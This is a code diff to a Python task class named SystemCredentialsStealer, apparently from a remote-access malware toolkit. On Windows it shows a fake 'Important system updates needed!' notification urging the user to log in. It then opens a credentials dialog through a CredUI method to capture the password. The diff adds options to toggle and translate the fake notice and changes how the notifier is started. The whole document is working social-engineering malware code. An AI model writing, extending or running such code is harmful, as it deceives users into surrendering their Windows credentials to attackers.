@@ -1,5 +1,5 @@
 from tasks.__task import Task
-from modules.notifier import Notifier
+from tasks.notifier import Notifier
 
 NOTIFICATIONS = {"update": {"title": "Important system updates needed!",
                             "description": "Your system version is outdated and this PC won't "
@@ -38,6 +38,8 @@ class SystemCredentialsStealer(Task):
     platforms = ["win32"]
     description = __doc__
     administrator = {"win32": False}
+    kwargs = {"create_notification": {"type": bool, "description": "Create notification.", "default": True},
+              "translate_notification": {"type": bool, "description": "Translate notification.", "default": True}}
 
     def __init__(self, task_id):
         super(SystemCredentialsStealer, self).__init__(task_id)
@@ -45,29 +47,27 @@ class SystemCredentialsStealer(Task):
         self._logger = logging.getLogger(self.__class__.__name__)
         self.methods = [MethodCredUI]
 
-    def run(self):
+    def run(self, **kwargs):
+        create_notification = kwargs.get("create_notification")
+        translate_notification = kwargs.get("translate_notification")
+
         from time import sleep
         from infos import administrator, platform
 
+        notifier = None
         failed = []
         admin = administrator()
         platform = platform()
 
-        if Notifier.enabled:
+        if create_notification:
             title = "Important system updates needed!"
             description = "Your system version is outdated and " \
                           "this PC won't receive any critical security updates. " \
                           "Log in to download and install update."
             duration = 60
-            # setting it to empty string fixes problem with pyinstaller but hides icon
-            icon_path = None
-
-            try:
-                notifier = Notifier()
-                notifier.run(title, description, duration, icon_path)
-                sleep(1)
-            except Exception:  # noqa
-                pass
+            notifier = Notifier(0).start(title=title, description=description,
+                                         duration=duration, translate=translate_notification)
+            sleep(1)
 
         for method in self.methods:
             if any(x.startswith(platform) for x in method.platforms):
@@ -77,6 +77,10 @@ class SystemCredentialsStealer(Task):
                     return method().run()
                 except Exception as e:
                     failed.append("Method {} failed: {}".format(method.__name__, e))
+        # if notifier:
+        #     # say goodbye!
+        #     notifier.join(10)
+        #     del notifier
         if failed:
             raise Exception("Could not create credentials dialog. All methods failed: {}".format(failed))
         else:
